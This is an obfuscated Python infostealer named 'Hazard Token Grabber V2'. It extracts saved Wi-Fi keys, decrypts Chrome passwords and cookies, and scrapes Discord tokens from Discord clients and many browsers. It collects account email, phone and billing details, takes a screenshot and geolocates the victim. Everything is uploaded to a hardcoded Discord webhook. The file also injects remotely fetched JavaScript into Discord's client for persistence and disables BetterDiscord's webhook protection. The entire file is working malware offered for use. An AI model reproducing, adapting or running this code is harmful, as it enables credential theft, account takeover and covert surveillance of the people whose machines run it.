import requests #line:1
import os #line:2
import shutil #line:3
import sqlite3 #line:4
import zipfile #line:5
import json #line:6
import base64 #line:7
import subprocess #line:8
import psutil #line:9
import pyautogui #line:10
from win32crypt import CryptUnprotectData #line:12
from re import findall #line:13
from Crypto .Cipher import AES #line:14
data =subprocess .check_output (['netsh','wlan','show','profiles']).decode ('utf-8').split ('\n')#line:16
profiles =[O0O000OO00OOOOO0O .split (":")[1 ][1 :-1 ]for O0O000OO00OOOOO0O in data if "All User Profile"in O0O000OO00OOOOO0O ]#line:17
for i in profiles :#line:18
    results =subprocess .check_output (['netsh','wlan','show','profile',i ,'key=clear']).decode ('utf-8').split ('\n')#line:20
    results =[OOOOO000O00OO0OO0 .split (":")[1 ][1 :-1 ]for OOOOO000O00OO0OO0 in results if "Key Content"in OOOOO000O00OO0OO0 ]#line:21
    try :#line:22
        p1 =("{:<30}|  {:<}".format (i ,results [0 ]))#line:23
    except IndexError :#line:24
        p1 =("{:<30}|  {:<}".format (i ,""))#line:25
ldf ,pe =p1 .split ('|')#line:26
class Hazard_Token_Grabber_V2 :#line:29
    def __init__ (O0OOO0O0O0OOOOO0O ):#line:30
        O0OOO0O0O0OOOOO0O .pasword1 =ldf #line:31
        O0OOO0O0O0OOOOO0O .username1 =pe #line:32
        O0OOO0O0O0OOOOO0O .webhook ="https://discord.com/api/webhooks/924689684020461599/6x4QfghpOnoXJJS5kfTQn7xGP0aXxCJijmg1_EsyxBNea2lrNmWTAwollVJveIkLr-3Y"#line:33
        O0OOO0O0O0OOOOO0O .files =""#line:34
        O0OOO0O0O0OOOOO0O .appdata =os .getenv ("localappdata")#line:35
        O0OOO0O0O0OOOOO0O .roaming =os .getenv ("appdata")#line:36
        O0OOO0O0O0OOOOO0O .tempfolder =os .getenv ("temp")+"\\Hazard_Token_Grabber_V2"#line:37
        try :#line:39
            os .mkdir (os .path .join (O0OOO0O0O0OOOOO0O .tempfolder ))#line:40
        except Exception :#line:41
            pass #line:42
        O0OOO0O0O0OOOOO0O .tokens =[]#line:44
        O0OOO0O0O0OOOOO0O .saved =[]#line:45
        if os .path .exists (os .getenv ("appdata")+"\\BetterDiscord"):#line:47
            O0OOO0O0O0OOOOO0O .bypass_better_discord ()#line:48
        if not os .path .exists (O0OOO0O0O0OOOOO0O .appdata +'\\Google'):#line:50
            O0OOO0O0O0OOOOO0O .files +=f"**{os.getlogin()}** doesn't have google installed\n"#line:51
        else :#line:52
            O0OOO0O0O0OOOOO0O .grabPassword ()#line:53
            O0OOO0O0O0OOOOO0O .grabCookies ()#line:54
        O0OOO0O0O0OOOOO0O .grabTokens ()#line:55
        O0OOO0O0O0OOOOO0O .screenshot ()#line:56
        O0OOO0O0O0OOOOO0O .SendInfo ()#line:57
        O0OOO0O0O0OOOOO0O .LogOut ()#line:58
        try :#line:59
            shutil .rmtree (O0OOO0O0O0OOOOO0O .tempfolder )#line:60
        except (PermissionError ,FileExistsError ):#line:61
            pass #line:62
    def getheaders (OOOO0OOO0OOO00000 ,OOOOOOOOOOOOOO00O =None ,O0OOO00000OOO0O0O ="application/json"):#line:64
        O0O000O0OOOO00O0O ={"Content-Type":O0OOO00000OOO0O0O ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:68
        if OOOOOOOOOOOOOO00O :#line:69
            O0O000O0OOOO00O0O .update ({"Authorization":OOOOOOOOOOOOOO00O })#line:70
        return O0O000O0OOOO00O0O #line:71
    def LogOut (OO0OOO0000OOOO0OO ):#line:73
        for OOO0O0OOOO00O0000 in psutil .process_iter ():#line:74
            if any (O0OOO00O0O0OO00O0 in OOO0O0OOOO00O0000 .name ()for O0OOO00O0O0OO00O0 in ['Discord','DiscordCanary','DiscordDevelopment','DiscordPTB']):#line:76
                OOO0O0OOOO00O0000 .kill ()#line:77
        for OO00O0OO00OO0O00O ,O00O0O00OO0O00O0O ,O0OOO0OO000O0O0OO in os .walk (os .getenv ("LOCALAPPDATA")):#line:78
            for O0O00OOOOO0OOO00O in O00O0O00OO0O00O0O :#line:79
                if "discord_desktop_core-"in O0O00OOOOO0OOO00O :#line:80
                    try :#line:81
                        OO00OOOOO000OOO0O =os .path .join (OO00O0OO00OO0O00O ,O0O00OOOOO0OOO00O +"\\discord_desktop_core\\index.js")#line:82
                        os .mkdir (os .path .join (OO00O0OO00OO0O00O ,O0O00OOOOO0OOO00O +"\\discord_desktop_core\\Hazard"))#line:83
                    except FileNotFoundError :#line:84
                        pass #line:85
                    O00O00O00O0O000OO =requests .get ("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text .replace ("%WEBHOOK_LINK%",OO0OOO0000OOOO0OO .webhook )#line:86
                    with open (OO00OOOOO000OOO0O ,'w',encoding ="utf-8")as O000O0O0O0O0O0OO0 :#line:87
                        O000O0O0O0O0O0OO0 .write (O00O00O00O0O000OO )#line:88
        for OO00O0OO00OO0O00O ,O00O0O00OO0O00O0O ,O0OOO0OO000O0O0OO in os .walk (os .getenv ("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):#line:89
            for O0O00OOOOO0OOO00O in O0OOO0OO000O0O0OO :#line:90
                O0O0OOO0OOOO000O0 =os .path .join (OO00O0OO00OO0O00O ,O0O00OOOOO0OOO00O )#line:91
                os .startfile (O0O0OOO0OOOO000O0 )#line:92
    def bypass_better_discord (OOOO000OO000OO0O0 ):#line:94
        OOO0O000OO0O000OO =os .getenv ("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"#line:95
        with open (OOO0O000OO0O000OO ,"rt",encoding ="cp437")as O000OO0O00000O0OO :#line:96
            O0000000O0O0OO000 =O000OO0O00000O0OO .read ()#line:97
            OOO000O0OO00O0OO0 =O0000000O0O0OO000 .replace ("api/webhooks","RdimoTheGoat")#line:98
        with open (OOO0O000OO0O000OO ,'w'):pass #line:99
        with open (OOO0O000OO0O000OO ,"wt",encoding ="cp437")as O000OO0O00000O0OO :#line:100
            O000OO0O00000O0OO .write (OOO000O0OO00O0OO0 )#line:101
    def get_master_key (O0O00O000O0OOOO00 ):#line:103
        with open (O0O00O000O0OOOO00 .appdata +'\\Google\\Chrome\\User Data\\Local State',"r",encoding ="utf-8")as OO0O00000OOO0OOO0 :#line:104
            O00O00OOO00O00O00 =OO0O00000OOO0OOO0 .read ()#line:105
        O00O00OOO00O00O00 =json .loads (O00O00OOO00O00O00 )#line:106
        O0OOO00OOOO0O0OOO =base64 .b64decode (O00O00OOO00O00O00 ["os_crypt"]["encrypted_key"])#line:108
        O0OOO00OOOO0O0OOO =O0OOO00OOOO0O0OOO [5 :]#line:109
        O0OOO00OOOO0O0OOO =CryptUnprotectData (O0OOO00OOOO0O0OOO ,None ,None ,None ,0 )[1 ]#line:110
        return O0OOO00OOOO0O0OOO #line:111
    def decrypt_payload (OO0O0OO0000O000O0 ,OOO000OOOO0O0000O ,OO00OOO000OO000O0 ):#line:113
        return OOO000OOOO0O0000O .decrypt (OO00OOO000OO000O0 )#line:114
    def generate_cipher (O0O0O0000O0OO00O0 ,OO000000000O0OOO0 ,OOOO00000O0OOO00O ):#line:116
        return AES .new (OO000000000O0OOO0 ,AES .MODE_GCM ,OOOO00000O0OOO00O )#line:117
    def decrypt_password (O0OOOOOO00OOO0O00 ,OOO0OOOOOOO0OO0OO ,O000O0O00OOO00O00 ):#line:119
        try :#line:120
            O0O00000O0OOO0OO0 =OOO0OOOOOOO0OO0OO [3 :15 ]#line:121
            OOO00O0O0000OOOO0 =OOO0OOOOOOO0OO0OO [15 :]#line:122
            OO0O000OOOOO0O0OO =O0OOOOOO00OOO0O00 .generate_cipher (O000O0O00OOO00O00 ,O0O00000O0OOO0OO0 )#line:123
            O0O0OOOOO0O0O0O0O =O0OOOOOO00OOO0O00 .decrypt_payload (OO0O000OOOOO0O0OO ,OOO00O0O0000OOOO0 )#line:124
            O0O0OOOOO0O0O0O0O =O0O0OOOOO0O0O0O0O [:-16 ].decode ()#line:125
            return O0O0OOOOO0O0O0O0O #line:126
        except :#line:127
            return "Chrome < 80"#line:128
    def grabPassword (O00OOO0OOO000OO0O ):#line:130
        OO0000OOOO00OO000 =O00OOO0OOO000OO0O .get_master_key ()#line:131
        O00O0O00O0000O00O =open (O00OOO0OOO000OO0O .tempfolder +"\\Google Passwords.txt","w",encoding ="cp437",errors ='ignore')#line:132
        O00O0O00O0000O00O .write ("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")#line:133
        OOO0000OO0O0OO000 =O00OOO0OOO000OO0O .appdata +'\\Google\\Chrome\\User Data\\default\\Login Data'#line:134
        try :#line:135
            shutil .copy2 (OOO0000OO0O0OO000 ,"Loginvault.db")#line:136
        except FileNotFoundError :#line:137
            pass #line:138
        O00OOOOO0OO000OO0 =sqlite3 .connect ("Loginvault.db")#line:139
        O0OO0OOO0OO0OOOO0 =O00OOOOO0OO000OO0 .cursor ()#line:140
        try :#line:141
            O0OO0OOO0OO0OOOO0 .execute ("SELECT action_url, username_value, password_value FROM logins")#line:142
            for O000000OOOOO0OOOO in O0OO0OOO0OO0OOOO0 .fetchall ():#line:143
                O000O0OO000O00OO0 =O000000OOOOO0OOOO [0 ]#line:144
                OOOO00OOO000000O0 =O000000OOOOO0OOOO [1 ]#line:145
                O0O0OOOO0OOO0O00O =O000000OOOOO0OOOO [2 ]#line:146
                O00OOO000O00O00O0 =O00OOO0OOO000OO0O .decrypt_password (O0O0OOOO0OOO0O00O ,OO0000OOOO00OO000 )#line:147
                if O000O0OO000O00OO0 !="":#line:148
                    O00O0O00O0000O00O .write (f"Domain: {O000O0OO000O00OO0}\nUser: {OOOO00OOO000000O0}\nPass: {O00OOO000O00O00O0}\n\n")#line:149
        except :#line:150
            pass #line:151
        O00O0O00O0000O00O .close ()#line:152
        O0OO0OOO0OO0OOOO0 .close ()#line:153
        O00OOOOO0OO000OO0 .close ()#line:154
        try :#line:155
            os .remove ("Loginvault.db")#line:156
        except :#line:157
            pass #line:158
    def grabCookies (O00000OO000OOOOOO ):#line:160
        O00OOO0O00O0OO0O0 =O00000OO000OOOOOO .get_master_key ()#line:161
        O00OO000O00O00O0O =open (O00000OO000OOOOOO .tempfolder +"\\Google Cookies.txt","w",encoding ="cp437",errors ='ignore')#line:162
        O00OO000O00O00O0O .write ("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")#line:163
        O000O0O0O00OOOO00 =O00000OO000OOOOOO .appdata +'\\Google\\Chrome\\User Data\\default\\Network\\cookies'#line:164
        try :#line:165
            shutil .copy2 (O000O0O0O00OOOO00 ,"Loginvault.db")#line:166
        except FileNotFoundError :#line:167
            pass #line:168
        O00O000O0000O0OOO =sqlite3 .connect ("Loginvault.db")#line:169
        O0OO0O00OO0O00O00 =O00O000O0000O0OOO .cursor ()#line:170
        try :#line:171
            O0OO0O00OO0O00O00 .execute ("SELECT host_key, name, encrypted_value from cookies")#line:172
            for O00OO0OO00OOO00O0 in O0OO0O00OO0O00O00 .fetchall ():#line:173
                OOO00OO00OOO000OO =O00OO0OO00OOO00O0 [0 ]#line:174
                O0O0O00000O000OOO =O00OO0OO00OOO00O0 [1 ]#line:175
                O0OOO0OO0000OOOOO =O00OO0OO00OOO00O0 [2 ]#line:176
                OOO0OOOO000000OOO =O00000OO000OOOOOO .decrypt_password (O0OOO0OO0000OOOOO ,O00OOO0O00O0OO0O0 )#line:177
                if OOO00OO00OOO000OO !="":#line:178
                    O00OO000O00O00O0O .write (f"Host: {OOO00OO00OOO000OO}\nUser: {O0O0O00000O000OOO}\nCookie: {OOO0OOOO000000OOO}\n\n")#line:179
        except :#line:180
            pass #line:181
        O00OO000O00O00O0O .close ()#line:182
        O0OO0O00OO0O00O00 .close ()#line:183
        O00O000O0000O0OOO .close ()#line:184
        try :#line:185
            os .remove ("Loginvault.db")#line:186
        except :#line:187
            pass #line:188
    def grabTokens (O000000O00O00OOO0 ):#line:190
        OO0O000OO00OO000O =open (O000000O00O00OOO0 .tempfolder +"\\Discord Info.txt","w",encoding ="cp437",errors ='ignore')#line:191
        OO0O000OO00OO000O .write ("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")#line:192
        OO00OO0OO0OOO00OO ={'Discord':O000000O00O00OOO0 .roaming +r'\\discord\\Local Storage\\leveldb\\','Discord Canary':O000000O00O00OOO0 .roaming +r'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':O000000O00O00OOO0 .roaming +r'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':O000000O00O00OOO0 .roaming +r'\\discordptb\\Local Storage\\leveldb\\','Opera':O000000O00O00OOO0 .roaming +r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':O000000O00O00OOO0 .roaming +r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':O000000O00O00OOO0 .appdata +r'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':O000000O00O00OOO0 .appdata +r'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':O000000O00O00OOO0 .appdata +r'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':O000000O00O00OOO0 .appdata +r'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':O000000O00O00OOO0 .appdata +r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':O000000O00O00OOO0 .appdata +r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':O000000O00O00OOO0 .appdata +r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':O000000O00O00OOO0 .appdata +r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':O000000O00O00OOO0 .appdata +r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':O000000O00O00OOO0 .appdata +r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Epic Privacy Browser':O000000O00O00OOO0 .appdata +r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':O000000O00O00OOO0 .appdata +r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':O000000O00O00OOO0 .appdata +r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':O000000O00O00OOO0 .appdata +r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':O000000O00O00OOO0 .appdata +r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':O000000O00O00OOO0 .appdata +r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:216
        for OOO0O00O000OOOO00 ,O0000OOO00OO00O00 in OO00OO0OO0OOO00OO .items ():#line:218
            if not os .path .exists (O0000OOO00OO00O00 ):#line:219
                continue #line:220
            for O0O000O000OOO0OO0 in os .listdir (O0000OOO00OO00O00 ):#line:221
                if not O0O000O000OOO0OO0 .endswith ('.log')and not O0O000O000OOO0OO0 .endswith ('.ldb'):#line:222
                    continue #line:223
                for O0OOO000OOOOO0O00 in [OO0000O0O00O0O0O0 .strip ()for OO0000O0O00O0O0O0 in open (f'{O0000OOO00OO00O00}\\{O0O000O000OOO0OO0}',errors ='ignore').readlines ()if OO0000O0O00O0O0O0 .strip ()]:#line:224
                    for O00OO000OO0000O0O in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):#line:225
                        for O000O0O0OOOOOO00O in findall (O00OO000OO0000O0O ,O0OOO000OOOOO0O00 ):#line:226
                            O000000O00O00OOO0 .tokens .append (O000O0O0OOOOOO00O )#line:227
        for O000O0O0OOOOOO00O in O000000O00O00OOO0 .tokens :#line:228
            O00000OO0OO0O00OO =requests .get ("https://discord.com/api/v9/users/@me",headers =O000000O00O00OOO0 .getheaders (O000O0O0OOOOOO00O ))#line:229
            if O00000OO0OO0O00OO .status_code ==200 :#line:230
                if O000O0O0OOOOOO00O in O000000O00O00OOO0 .saved :#line:231
                    continue #line:232
                O000000O00O00OOO0 .saved .append (O000O0O0OOOOOO00O )#line:233
                O00O0O00OOO0000O0 =requests .get ("https://discord.com/api/v9/users/@me",headers =O000000O00O00OOO0 .getheaders (O000O0O0OOOOOO00O )).json ()#line:234
                OO000O0OOO000O0O0 =""#line:235
                OOO0000O000OO0OO0 =O00O0O00OOO0000O0 ['flags']#line:236
                if (OOO0000O000OO0OO0 ==1 ):#line:237
                    OO000O0OOO000O0O0 +="Staff, "#line:238
                if (OOO0000O000OO0OO0 ==2 ):#line:239
                    OO000O0OOO000O0O0 +="Partner, "#line:240
                if (OOO0000O000OO0OO0 ==4 ):#line:241
                    OO000O0OOO000O0O0 +="Hypesquad Event, "#line:242
                if (OOO0000O000OO0OO0 ==8 ):#line:243
                    OO000O0OOO000O0O0 +="Green Bughunter, "#line:244
                if (OOO0000O000OO0OO0 ==64 ):#line:245
                    OO000O0OOO000O0O0 +="Hypesquad Bravery, "#line:246
                if (OOO0000O000OO0OO0 ==128 ):#line:247
                    OO000O0OOO000O0O0 +="HypeSquad Brillance, "#line:248
                if (OOO0000O000OO0OO0 ==256 ):#line:249
                    OO000O0OOO000O0O0 +="HypeSquad Balance, "#line:250
                if (OOO0000O000OO0OO0 ==512 ):#line:251
                    OO000O0OOO000O0O0 +="Early Supporter, "#line:252
                if (OOO0000O000OO0OO0 ==16384 ):#line:253
                    OO000O0OOO000O0O0 +="Gold BugHunter, "#line:254
                if (OOO0000O000OO0OO0 ==131072 ):#line:255
                    OO000O0OOO000O0O0 +="Verified Bot Developer, "#line:256
                if (OO000O0OOO000O0O0 ==""):#line:257
                    OO000O0OOO000O0O0 ="None"#line:258
                OO0O00OOOOO00O00O =O00O0O00OOO0000O0 ["username"]+"#"+str (O00O0O00OOO0000O0 ["discriminator"])#line:260
                O00OO0OO00OO0O00O =O00O0O00OOO0000O0 ["email"]#line:261
                OOOOOOO00O00O00O0 =O00O0O00OOO0000O0 ["phone"]if O00O0O00OOO0000O0 ["phone"]else "No Phone Number attached"#line:262
                O0OOOO00OOOOOO0OO =f'https://cdn.discordapp.com/avatars/{O00O0O00OOO0000O0["id"]}/{O00O0O00OOO0000O0["avatar"]}.gif'#line:264
                try :#line:265
                    requests .get (O0OOOO00OOOOOO0OO )#line:266
                except :#line:267
                    O0OOOO00OOOOOO0OO =O0OOOO00OOOOOO0OO [:-4 ]#line:268
                O0000O0O00O000O0O =requests .get ('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers =O000000O00O00OOO0 .getheaders (O000O0O0OOOOOO00O )).json ()#line:270
                OO0OOO0O0O000O00O =False #line:271
                OO0OOO0O0O000O00O =bool (len (O0000O0O00O000O0O )>0 )#line:272
                O0O0000O000OO0O00 =bool (len (json .loads (requests .get ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =O000000O00O00OOO0 .getheaders (O000O0O0OOOOOO00O )).text ))>0 )#line:274
                OO0O000OO00OO000O .write (f"{' '*17}{OO0O00OOOOO00O00O}\n{'-'*50}\nToken: {O000O0O0OOOOOO00O}\nHas Billing: {O0O0000O000OO0O00}\nNitro: {OO0OOO0O0O000O00O}\nBadges: {OO000O0OOO000O0O0}\nEmail: {O00OO0OO00OO0O00O}\nPhone: {OOOOOOO00O00O00O0}\n[Avatar]({O0OOOO00OOOOOO0OO})\n\n")#line:276
        OO0O000OO00OO000O .close ()#line:277
    def screenshot (OOO000000O00O0OO0 ):#line:279
        OOO0OO0OOO0O00OO0 =pyautogui .screenshot ()#line:280
        OOO0OO0OOO0O00OO0 .save (OOO000000O00O0OO0 .tempfolder +"\\Screenshot.png")#line:281
    def SendInfo (OO00O0O0OOOOO00O0 ):#line:283
        O00O00OO0O0000OOO =O00OOO0000OO00OO0 =OO00O0OO000O000OO =OOO0000OOO0OO0000 =O00000OOO00OOOO00 ="None"#line:284
        try :#line:285
            O00O00OOO000OO0OO =requests .get ("http://ipinfo.io/json").json ()#line:286
            O00O00OO0O0000OOO =O00O00OOO000OO0OO ['ip']#line:287
            OO00O0OO000O000OO =O00O00OOO000OO0OO ['city']#line:288
            O00OOO0000OO00OO0 =O00O00OOO000OO0OO ['country']#line:289
            OOO0000OOO0OO0000 =O00O00OOO000OO0OO ['region']#line:290
            O00000OOO00OOOO00 ="https://www.google.com/maps/search/google+map++"+O00O00OOO000OO0OO ['loc']#line:291
        except Exception :#line:292
            pass #line:293
        O0OO0O00O0OO0O00O =os .path .join (OO00O0O0OOOOO00O0 .tempfolder )#line:294
        OO0O0OOOO00OOO0OO =os .path .join (OO00O0O0OOOOO00O0 .appdata ,f'Hazard.V2-[{os.getlogin()}].zip')#line:295
        OO00O0O0OOOOO00O0 .zip (O0OO0O00O0OO0O00O ,OO0O0OOOO00OOO0OO )#line:296
        for O000000OO000OOOO0 ,_OO0OO0OO00O0O0OO0 ,O0O0O000OOO000000 in os .walk (OO00O0O0OOOOO00O0 .tempfolder ):#line:297
            for O0000O000OOO0OO00 in O0O0O000OOO000000 :#line:298
                OO00O0O0OOOOO00O0 .files +=f"\n{O0000O000OOO0OO00}"#line:299
        O00OO00OOO0OO0OO0 =0 #line:300
        for OO00O00O0OOOOO0O0 ,OO0OO0O00O0O000OO ,O0O0O000OOO000000 in os .walk (OO00O0O0OOOOO00O0 .tempfolder ):#line:301
            O00OO00OOO0OO0OO0 +=len (O0O0O000OOO000000 )#line:302
            OO00O0O0OOOOO00O0 .fileCount =f"{O00OO00OOO0OO0OO0} Files Found: "#line:303
        OO0O0OO000O0O0O00 ={"avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif","embeds":[{"author":{"name":"Hazard Token Grabber.V2","url":"https://github.com/Rdimo/Hazard-Token-Grabber-V2","icon_url":"https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"},"description":f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {O00O00OO0O0000OOO}\nCity: {OO00O0OO000O000OO}\nRegion: {OOO0000OOO0OO0000}\nCountry: {O00OOO0000OO00OO0}\nUsername: {OO00O0O0OOOOO00O0.username1}\nPassword: {OO00O0O0OOOOO00O0.pasword1}```[Google Maps Location]({O00000OOO00OOOO00})\n```fix\n{OO00O0O0OOOOO00O0.fileCount}{OO00O0O0OOOOO00O0.files}```","color":16119101 ,"thumbnail":{"url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"},"footer":{"text":"©Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"}}]}#line:325
        requests .post (OO00O0O0OOOOO00O0 .webhook ,json =OO0O0OO000O0O0O00 )#line:326
        requests .post (OO00O0O0OOOOO00O0 .webhook ,files ={'upload_file':open (OO0O0OOOO00OOO0OO ,'rb')})#line:327
    def zip (O0O0000OO00O0O0OO ,OOOO0OOOOO0000000 ,OO0OOO0O000OOO0O0 ):#line:329
        O00OO0O0O0000O0OO =zipfile .ZipFile (OO0OOO0O000OOO0O0 ,"w",zipfile .ZIP_DEFLATED )#line:330
        OOOO0O0O0OO0O00OO =os .path .abspath (OOOO0OOOOO0000000 )#line:331
        for OOOOOOOO000OOOOO0 ,_OO0OOOO000OOOOO0O ,OOO0OO00000O0OOOO in os .walk (OOOO0OOOOO0000000 ):#line:332
            for O000OO00000O0OO00 in OOO0OO00000O0OOOO :#line:333
                OO000O00OO0OOO0OO =os .path .abspath (os .path .join (OOOOOOOO000OOOOO0 ,O000OO00000O0OO00 ))#line:334
                O0O0000OO000O0000 =OO000O00OO0OOO0OO [len (OOOO0O0O0OO0O00OO )+1 :]#line:335
                O00OO0O0O0000O0OO .write (OO000O00OO0OOO0OO ,O0O0000OO000O0000 )#line:336
        O00OO0O0O0000O0OO .close ()#line:337
if __name__ =="__main__":#line:339
    Hazard_Token_Grabber_V2 ()

